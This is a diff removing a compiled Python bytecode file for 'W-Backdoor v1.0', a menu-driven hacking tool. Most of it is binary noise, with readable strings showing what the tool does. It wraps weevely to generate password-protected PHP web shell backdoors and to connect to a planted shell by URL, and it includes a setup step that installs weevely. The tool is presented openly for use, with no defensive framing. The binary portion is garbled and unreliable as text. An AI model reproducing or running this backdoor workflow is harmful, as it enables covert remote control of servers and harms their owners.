@@ -1,54 +1,0 @@
-a
-
-����#¡¥bÂ
-��ã�������������������@���s`��d�dl�Z�d�dlZdZe� d¡�ee�edZedkrledZedZedZ	e� d	 
-ee	e¡¡�ed
-�q&edkredZe� d
- 
-e¡¡�q&edkrêe d¡�ed�e d¡�ed�e d¡�ed�e d¡�e� d¡�ed�q&edksüedkred�q&edkre� d¡�q&edkr0ee�q&edkrDed�q&edks\edkr&q\q&dS�)é����Na��
-[0;36m __      __         __________                __       .___                   
-/  \    /  \        \______   \_____    ____ |  | __ __| _/____   ___________ 
-\   \/\/   /  ______ |    |  _/\__  \ _/ ___\|  |/ // __ |/  _ \ /  _ \_  __ |
- \        /  /_____/ |    |   \ / __ \  \___|    </ /_/ (  <_> |  <_> )  | \|
-  \__/\  /           |______  /(____  /\___  >__|_ \____ |\____/ \____/|__|   
-       \/                   \/      \/     \/     \/    \/                    
-                                                    
-            [0;35m    .::. [0;37mW-Backdoor v1.0 Coded By @wolkan [0;35m.::.
-                     [0;31m[      Everything for you      ]
-                
-[0;31m[[0;33m1[0;31m]>[0;32m Backdoor-Generate
-[0;31m[[0;33m2[0;31m]>[0;32m Backdoor-Connect
-[0;31m[[0;33m3[0;31m]>[0;32m Setup
-[0;31m[[0;33mh[0;31m]>[0;32m Help
-[0;31m[[0;33me[0;31m]>[0;32m Exit
-Úclearz:[0;31m[1m[[0;36m[1mw-backdoor[0;31m[1m]>[1m[0;32m Ú1zName: z
-Password: zOutput: zweevely generate {} {}{}.phpz/[0;34m[1m[+][0m [0;32mSuccessfully created
-Ú2zUrl: z
-weevely {}Ú3é���z)[0;34m[1m[+][0m [0;32mPreparing filesé���z3[0;34m[1m[+][0m [0;32mMaking final preparationsé���z+[0;34m[1m[+][0m [0;32mDownloading fileszapt install weevelyz8[0;34m[1m[+][0m [0;32mFiles downloaded successfully
-ÚhÚhelpaX��W-Backdoor 1.0 ( https://github.com/wolk4n )
-Usage: python w-backdoor.py, choose one of the options in the main menu and follow the steps the program says.
-COMMANDS:
-    e [exit]: Exits the program.
-    h [help]: Prints this help page.
-    version: Shows the version of the program.
-    clear: Clears the screen.
-    menu: Shows the main menu.
-ÚmenuÚversionz-W-Backdoor V1.0  (https://github.com/wolk4n)
-ÚeÚexit)
-ÚosÚtimer���ÚsystemÚprintÚinputZchoiceÚnameZpasswdÚoutputÚformatZurlÚsleep©�r���r���ú
-w-backdoor.pyÚ<module>���sD���
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
